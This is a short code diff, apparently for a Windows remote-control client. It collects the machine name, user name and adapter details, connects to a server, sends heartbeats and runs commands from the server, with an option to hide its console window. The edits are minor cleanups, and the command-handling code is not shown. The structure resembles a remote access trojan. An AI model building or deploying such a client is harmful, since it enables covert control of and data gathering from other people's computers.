@@ -1,14 +1,16 @@
 #include "main_client.h"
 
 int main() {
+	HANDLE thread1;
 	ShowWindow(GetConsoleWindow(), 
 		//SW_HIDE
 		SW_NORMAL
 	); // Hide the console window
 	int ret = getMachineInformation(); if(ret) goto _error;
 	if ((ret = connectToServer()) != 0) { goto _error; }
-	CreateThread(NULL, 0, sendHeartbeat, NULL, 0, NULL);
+	thread1 = CreateThread(NULL, 0, sendHeartbeat, NULL, 0, NULL);
 	handleServerCommands();
+	CloseHandle(thread1);
 _error: return ret;
 }
 
@@ -36,7 +38,7 @@ int getMachineInformation() {
 	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
 	PIP_ADAPTER_INFO pAdapter = nullptr;
 	DWORD size = sizeof(computerName);
-	DWORD userNameSize = sizeof(userName), ret;
+	DWORD userNameSize = sizeof(userName);
 	int ret = 0;
 	GetComputerNameA(computerName, &size);
 	GetUserNameA(userName, &userNameSize);
@@ -58,7 +60,7 @@ int getMachineInformation() {
 			pAdapter = pAdapter->Next;
 		}
 	}
-	else printf("%d", ret);
+	//else printf("%d", ret);
 	free(pAdapterInfo);
 	return ret;
 }
